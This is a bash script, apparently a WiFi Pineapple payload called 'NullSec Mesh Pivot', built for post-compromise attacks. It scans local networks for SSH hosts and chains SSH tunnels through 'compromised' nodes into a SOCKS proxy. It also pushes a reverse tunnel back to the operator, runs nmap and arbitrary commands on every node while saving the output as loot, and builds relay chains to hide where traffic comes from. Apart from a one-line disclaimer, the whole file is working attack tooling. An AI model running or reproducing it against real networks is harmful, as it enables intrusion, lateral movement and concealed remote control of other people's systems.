#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Mesh Pivot
# Multi-hop pivoting through compromised wireless nodes
# Uses NullSec mesh network for distributed attack relay
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/mesh-pivot"
DATE_TAG=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$LOOT_DIR/pivot_${DATE_TAG}.log"
MESH_DB="$LOOT_DIR/mesh_nodes.db"
PIVOT_PORT_BASE=4400
MESH_USER=\"${MESH_USER:-root}\"           # SSH user for mesh pivoting
TUNNEL_KEY="/tmp/mesh_pivot_key"

mkdir -p "$LOOT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BLUE='\033[0;34m'
NC='\033[0m'

banner() {
    echo -e "${BLUE}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║              NULLSEC MESH PIVOT v1.0                          ║
    ║                                                               ║
    ║         Multi-Hop Wireless Attack Relay                       ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local level="$1"
    shift
    case "$level" in
        INFO)  echo -e "${GREEN}[INFO]${NC} $*" ;;
        WARN)  echo -e "${YELLOW}[WARN]${NC} $*" ;;
        ALERT) echo -e "${RED}[ALERT]${NC} $*" ;;
        PIVOT) echo -e "${MAGENTA}[PIVOT]${NC} $*" ;;
        MESH)  echo -e "${BLUE}[MESH]${NC} $*" ;;
        SCAN)  echo -e "${CYAN}[SCAN]${NC} $*" ;;
    esac
    echo "[$(date '+%H:%M:%S')] [$level] $*" >> "$LOG_FILE"
}

# Generate encryption key for tunnel
gen_tunnel_key() {
    if [ ! -f "$TUNNEL_KEY" ]; then
        openssl rand -hex 32 > "$TUNNEL_KEY"
        chmod 600 "$TUNNEL_KEY"
        log INFO "Tunnel key generated"
    fi
}

# Discover mesh nodes via multiple methods
discover_nodes() {
    log MESH "Discovering mesh nodes..."
    
    > "$MESH_DB"
    
    # Method 1: NullSec mesh beacon (custom probe)
    log SCAN "Scanning for NullSec mesh beacons..."
    
    # Send mesh discovery probe
    local my_ip=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    local subnet=$(echo "$my_ip" | sed 's/\.[0-9]*$/.0\/24/')
    
    # ARP scan the local network
    if command -v arp-scan &>/dev/null; then
        arp-scan -l 2>/dev/null | grep -E "^[0-9]" | while IFS=$'\t' read -r ip mac vendor; do
            echo "ARP|$ip|$mac|$vendor" >> "$MESH_DB"
        done
    fi
    
    # Method 2: Check for SSH-accessible hosts
    log SCAN "Checking SSH connectivity..."
    grep "^ARP" "$MESH_DB" | while IFS='|' read -r method ip mac vendor; do
        if timeout 2 nc -z "$ip" 22 2>/dev/null; then
            log MESH "  SSH accessible: $ip ($vendor)"
            sed -i "s|ARP|$ip|SSH|$ip|$mac|$vendor|" "$MESH_DB" 2>/dev/null
            echo "SSH|$ip|$mac|$vendor" >> "$MESH_DB"
        fi
    done
    
    # Method 3: Known NullSec mesh nodes (configure via NULLSEC_NODES env or edit below)
    KNOWN_NODES=(
        # Format: "ip|name|os" - edit these for your network
        # "192.168.1.1|gateway|linux"
        # "192.168.1.100|node-1|windows"
        # "192.168.1.101|node-2|linux"
    )
    
    for node in "${KNOWN_NODES[@]}"; do
        IFS='|' read -r ip name os <<< "$node"
        if ping -c1 -W1 "$ip" &>/dev/null; then
            echo "MESH|$ip|$name|$os" >> "$MESH_DB"
            log MESH "  Known node online: $ip ($name/$os)"
        fi
    done
    
    # Method 4: Scan for Pineapple devices
    for potential in 172.16.42.1 10.0.0.1; do
        if ping -c1 -W1 "$potential" &>/dev/null; then
            echo "PINE|$potential|pineapple|openwrt" >> "$MESH_DB"
            log MESH "  Pineapple detected: $potential"
        fi
    done
    
    TOTAL=$(sort -u "$MESH_DB" | wc -l)
    log INFO "Discovered $TOTAL nodes"
}

# Create SSH tunnel through pivot chain
ssh_pivot() {
    local pivot_chain="$1"  # comma-separated: ip1,ip2,ip3
    
    IFS=',' read -ra PIVOTS <<< "$pivot_chain"
    local num_hops=${#PIVOTS[@]}
    
    log PIVOT "Creating $num_hops-hop SSH tunnel chain..."
    
    local port=$PIVOT_PORT_BASE
    local ssh_cmd=""
    
    for i in "${!PIVOTS[@]}"; do
        local hop="${PIVOTS[$i]}"
        local next_port=$((port + 1))
        
        if [ "$i" -eq 0 ]; then
            # First hop - direct connection
            log PIVOT "  Hop $((i+1)): localhost:$port → $hop"
            ssh -f -N -L "$port:${PIVOTS[$((i+1))]:-localhost}:22" \
                -o StrictHostKeyChecking=no \
                -o ConnectTimeout=5 \
                "${MESH_USER}@$hop" 2>/dev/null
        elif [ "$i" -lt $((num_hops - 1)) ]; then
            # Middle hops - chain through previous tunnel
            log PIVOT "  Hop $((i+1)): :$port → $hop → ${PIVOTS[$((i+1))]}"
            ssh -f -N -L "$next_port:${PIVOTS[$((i+1))]}:22" \
                -o StrictHostKeyChecking=no \
                -p "$port" \
                "${MESH_USER}@localhost" 2>/dev/null
            port=$next_port
        else
            # Final hop - SOCKS proxy
            log PIVOT "  Hop $((i+1)) (final): SOCKS5 on :$((port + 10))"
            ssh -f -N -D "$((port + 10))" \
                -o StrictHostKeyChecking=no \
                -p "$port" \
                "${MESH_USER}@localhost" 2>/dev/null
            
            log PIVOT "SOCKS5 proxy available on localhost:$((port + 10))"
            echo "$((port + 10))"
        fi
    done
    
    log PIVOT "Tunnel chain established ($num_hops hops)"
}

# Reverse tunnel from compromised node back to us
reverse_tunnel() {
    local target_ip="$1"
    local local_port="${2:-4444}"
    local remote_port="${3:-4445}"
    
    log PIVOT "Creating reverse tunnel from $target_ip..."
    log PIVOT "  Remote:$remote_port → Local:$local_port"
    
    # Push reverse SSH command to target
    ssh -o StrictHostKeyChecking=no "${MESH_USER}@$target_ip" \
        "ssh -f -N -R $local_port:localhost:$remote_port \
         -o StrictHostKeyChecking=no \
         ${MESH_USER}@$(ip route get 1 | awk '{print $7; exit}')" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log PIVOT "Reverse tunnel established"
        log PIVOT "  Access target via: localhost:$local_port"
    else
        log WARN "Reverse tunnel failed"
    fi
}

# Distributed port scan through mesh
distributed_scan() {
    local target="$1"
    local port_range="${2:-1-1024}"
    
    log PIVOT "Distributed scan: $target ($port_range) across mesh..."
    
    # Get active mesh nodes
    local nodes=($(grep -E "^(SSH|MESH)" "$MESH_DB" | awk -F'|' '{print $2}' | sort -u))
    local num_nodes=${#nodes[@]}
    
    if [ "$num_nodes" -eq 0 ]; then
        log WARN "No mesh nodes available. Running local scan."
        nmap -p "$port_range" "$target" -oN "$LOOT_DIR/scan_${target}_${DATE_TAG}.txt" 2>/dev/null
        return
    fi
    
    log INFO "Distributing across $num_nodes nodes..."
    
    # Split port range across nodes
    local start=$(echo "$port_range" | cut -d- -f1)
    local end=$(echo "$port_range" | cut -d- -f2)
    local total=$((end - start + 1))
    local chunk=$((total / num_nodes))
    
    SCAN_RESULT="$LOOT_DIR/distributed_scan_${target}_${DATE_TAG}.txt"
    > "$SCAN_RESULT"
    
    for i in "${!nodes[@]}"; do
        local node="${nodes[$i]}"
        local p_start=$((start + i * chunk))
        local p_end=$((p_start + chunk - 1))
        [ "$i" -eq $((num_nodes - 1)) ] && p_end=$end
        
        log SCAN "  Node $node: ports $p_start-$p_end"
        
        # Run scan on remote node
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "${MESH_USER}@$node" \
            "nmap -p $p_start-$p_end $target -Pn --open 2>/dev/null | grep ^[0-9]" \
            >> "$SCAN_RESULT" 2>/dev/null &
    done
    
    # Wait for all scans
    wait
    
    # Sort and display results
    sort -t/ -k1 -n "$SCAN_RESULT" -o "$SCAN_RESULT"
    local open_ports=$(wc -l < "$SCAN_RESULT" 2>/dev/null)
    
    log INFO "Distributed scan complete: $open_ports open ports"
    cat "$SCAN_RESULT" | while read -r line; do
        log ALERT "  $line"
    done
}

# Execute command across all mesh nodes
mesh_exec() {
    local command="$1"
    
    log MESH "Mesh execute: $command"
    
    local nodes=($(grep -E "^(SSH|MESH)" "$MESH_DB" | awk -F'|' '{print $2}' | sort -u))
    
    for node in "${nodes[@]}"; do
        log MESH "  → $node:"
        local output=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "${MESH_USER}@$node" "$command" 2>/dev/null)
        
        if [ $? -eq 0 ]; then
            echo "$output" | head -5
            echo "$output" >> "$LOOT_DIR/mesh_exec_${DATE_TAG}.txt"
        else
            log WARN "    Failed"
        fi
    done
}

# Traffic relay through mesh for anonymization
traffic_relay() {
    local target_ip="$1"
    local target_port="$2"
    local num_hops="${3:-2}"
    
    log PIVOT "Setting up traffic relay ($num_hops hops) to $target_ip:$target_port..."
    
    local nodes=($(grep -E "^(SSH|MESH)" "$MESH_DB" | awk -F'|' '{print $2}' | sort -R | head -n "$num_hops"))
    
    if [ ${#nodes[@]} -lt "$num_hops" ]; then
        log WARN "Only ${#nodes[@]} nodes available for relay (requested $num_hops)"
        num_hops=${#nodes[@]}
    fi
    
    local port=$PIVOT_PORT_BASE
    
    # Build relay chain
    for i in "${!nodes[@]}"; do
        local node="${nodes[$i]}"
        local next_port=$((port + 1))
        
        if [ "$i" -eq $((num_hops - 1)) ]; then
            # Final relay to target
            log PIVOT "  Relay $((i+1)) (final): $node → $target_ip:$target_port"
            ssh -f -N -L "$next_port:$target_ip:$target_port" \
                -o StrictHostKeyChecking=no \
                "${MESH_USER}@$node" 2>/dev/null
        else
            # Intermediate relay
            log PIVOT "  Relay $((i+1)): $node → ${nodes[$((i+1))]}"
            ssh -f -N -L "$next_port:${nodes[$((i+1))]}:22" \
                -o StrictHostKeyChecking=no \
                "${MESH_USER}@$node" 2>/dev/null
        fi
        
        port=$next_port
    done
    
    log PIVOT "Relay chain established. Connect via localhost:$port"
}

# Mesh status dashboard
mesh_status() {
    log MESH "Mesh status check..."
    
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                    MESH PIVOT STATUS                         ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
    
    grep -v "^$" "$MESH_DB" 2>/dev/null | sort -u | while IFS='|' read -r type ip name os; do
        local status="${RED}OFFLINE${NC}"
        local latency="--"
        
        if ping -c1 -W1 "$ip" &>/dev/null; then
            latency=$(ping -c1 -W1 "$ip" 2>/dev/null | grep -oP 'time=\K[0-9.]+')
            
            if timeout 2 nc -z "$ip" 22 2>/dev/null; then
                status="${GREEN}SSH OK${NC}"
            else
                status="${YELLOW}UP/NO SSH${NC}"
            fi
        fi
        
        printf "${CYAN}║${NC} %-5s %-16s %-12s %-10s %-8s ${CYAN}║${NC}\n" \
            "$type" "$ip" "$name" "$status" "${latency}ms"
    done
    
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════╣${NC}"
    
    # Show active tunnels
    local tunnels=$(ps aux | grep "ssh.*-[fNLD]" | grep -v grep | wc -l)
    echo -e "${CYAN}║${NC} Active tunnels: $tunnels"
    
    ps aux | grep "ssh.*-[fNLD]" | grep -v grep | while read -r line; do
        local port=$(echo "$line" | grep -oP ':\K[0-9]+' | head -1)
        echo -e "${CYAN}║${NC}   Port $port: $(echo "$line" | awk '{print $NF}')"
    done
    
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
}

# Cleanup all tunnels
cleanup() {
    log WARN "Cleaning up all pivot tunnels..."
    pkill -f "ssh.*-[fNLD]" 2>/dev/null
    log INFO "All tunnels terminated"
}

# Menu
menu() {
    echo -e "\n${CYAN}Mesh Pivot Modes:${NC}"
    echo -e "  ${GREEN}1)${NC} Discover Mesh Nodes"
    echo -e "  ${GREEN}2)${NC} SSH Pivot Chain"
    echo -e "  ${GREEN}3)${NC} Reverse Tunnel"
    echo -e "  ${GREEN}4)${NC} Distributed Port Scan"
    echo -e "  ${GREEN}5)${NC} Mesh Execute"
    echo -e "  ${GREEN}6)${NC} Traffic Relay"
    echo -e "  ${GREEN}7)${NC} Mesh Status"
    echo -e "  ${GREEN}8)${NC} Cleanup Tunnels"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo -ne "\n${YELLOW}Select mode: ${NC}"
    read -r mode
    
    case $mode in
        1) discover_nodes ;;
        2)
            echo -ne "${YELLOW}Pivot chain (ip1,ip2,...): ${NC}"; read -r chain
            ssh_pivot "$chain"
            ;;
        3)
            echo -ne "${YELLOW}Target IP: ${NC}"; read -r tip
            echo -ne "${YELLOW}Local port [4444]: ${NC}"; read -r lp
            echo -ne "${YELLOW}Remote port [4445]: ${NC}"; read -r rp
            reverse_tunnel "$tip" "${lp:-4444}" "${rp:-4445}"
            ;;
        4)
            echo -ne "${YELLOW}Target: ${NC}"; read -r target
            echo -ne "${YELLOW}Port range [1-1024]: ${NC}"; read -r ports
            distributed_scan "$target" "${ports:-1-1024}"
            ;;
        5)
            echo -ne "${YELLOW}Command: ${NC}"; read -r cmd
            mesh_exec "$cmd"
            ;;
        6)
            echo -ne "${YELLOW}Target IP: ${NC}"; read -r tip
            echo -ne "${YELLOW}Target port: ${NC}"; read -r tp
            echo -ne "${YELLOW}Hops [2]: ${NC}"; read -r hops
            traffic_relay "$tip" "$tp" "${hops:-2}"
            ;;
        7) mesh_status ;;
        8) cleanup ;;
        0) exit 0 ;;
    esac
}

main() {
    banner
    gen_tunnel_key
    
    while true; do
        menu
    done
}

main "$@"
